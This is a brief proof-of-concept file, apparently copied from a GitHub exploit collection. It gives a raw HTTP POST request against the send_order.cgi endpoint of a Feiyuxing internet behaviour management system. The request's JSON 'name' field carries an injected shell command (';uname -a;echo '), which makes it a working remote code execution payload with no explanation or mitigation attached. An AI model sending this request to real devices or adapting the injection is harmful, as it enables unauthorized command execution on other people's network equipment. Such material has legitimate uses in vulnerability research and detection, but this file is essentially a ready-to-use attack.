# feiyuxing_send_order_rce

from: https://github.com/wy876/POC/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BC%81%E4%B8%9A%E7%89%88%E5%89%8D%E5%8F%B0RCE.md 
2024.3.25 @2
```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

{"opid":"777777777777777777","name":";uname -a;echo ","type":"rest"}
```
